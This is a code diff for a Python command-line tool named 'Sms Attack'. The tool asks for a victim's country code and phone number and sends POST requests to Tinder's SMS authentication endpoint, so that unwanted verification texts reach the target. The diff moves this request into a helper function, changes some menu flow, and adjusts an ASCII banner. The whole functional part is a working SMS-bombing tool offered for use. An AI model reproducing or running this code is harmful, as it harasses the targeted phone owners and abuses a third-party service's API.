@@ -20,6 +20,8 @@ import random
 
 import webbrowser
 
+import requests
+
 try:
 
     import requests
@@ -68,24 +70,31 @@ def exitt():
 
 def docs():
     webbrowser.open('https://github.com/AnilKrkmz/Sms-Attack')
+    clr()
+    banner()
+    system()
 def system():
 
     console1 = input("\033[91m \n\n[*]Sms Attack: \033[0m " )
 
     def service_list():
+
+        def messageT():
+            url = "https://api.gotinder.com/v2/auth/sms/send"
+            payloadT = {
+    "auth_type": "sms",
+    "locale": "tr",
+    "phone_number": "{}{}".format(console3,console4)
+}
+            response = requests.request("POST", url, data = payloadT)
+            print(response.text.encode('utf8')) 
+
         console2 = input("\033[93m \n\n[1]Tinder\033[95m\n\nChoose Service: \033[0m")
         if console2 == "1":
             console3 = input("\033[96m \n\nEnter the country code(Exp:+31): \033[0m")
             if console3 == "+90":
                 console4 = input("\033[96m \n\nEnter the target number without + : \033[0m")
-                url = "https://api.gotinder.com/v2/auth/sms/send"
-                payload = {
-    "auth_type": "sms",
-    "locale": "tr",
-    "phone_number": "{}{}".format(console3,console4)
-}
-                response = requests.request("POST", url, data = payload)
-                print(response.text.encode('utf8'))               
+                messageT()
                 if console4 == "/clear":
                     clear()
                 elif console4 =="/exit":
@@ -107,8 +116,9 @@ def system():
         else:
             print("\033[92mUnfortunately but service number you have written is not avaiable at the moment.\033[0m")
             service_list()
-                                  
 
+
+                                  
 
     def helpage():
 
@@ -163,9 +173,8 @@ def banner():
 \033[96m    \_/  \___||_|   |_||_|  |_| \___|\_           \033[92m  \ \  \|\  \|___ \  \_\|___ \  \_\ \  \|\  \ \  \___|\ \  \\\  \   
 \033[96m   \|____|\  \ \  \    \ \  \|____|\  \           \033[92m   \ \   __  \   \ \  \     \ \  \ \ \   __  \ \  \    \ \   __  \  
 \033[96m     ____\_\  \ \__\    \ \__\____\_\  \          \033[92m    \ \  \ \  \   \ \  \     \ \  \ \ \  \ \  \ \  \____\ \  \ \  \ 
-\033[96m    |\_________\|__|     \|__|\_________\         \033[92m     \ \__\ \__\   \ \__\     \ \__\ \ \__\ \__\ \_______\ \__\ \__\
-    
-\033[96m   \|_________|             \|_________|         \033[92m      \|__|\|__|    \|__|      \|__|  \|__|\|__|\|_______|\|__|\|__|
+\033[96m    |\_________\|__|     \|__|\_________\         \033[92m     \ \__\ \__\   \ \__\     \ \__\ \ \__\ \__\ \_______\ \__\ \__\ 
+\033[96m    \|_________|             \|_________|         \033[92m      \|__|\|__|    \|__|      \|__|  \|__|\|__|\|_______|\|__|\|__|
 
 \033[92mType /help into the console to learn commands
 
@@ -178,4 +187,3 @@ def banner():
 
 banner()
 system()
-
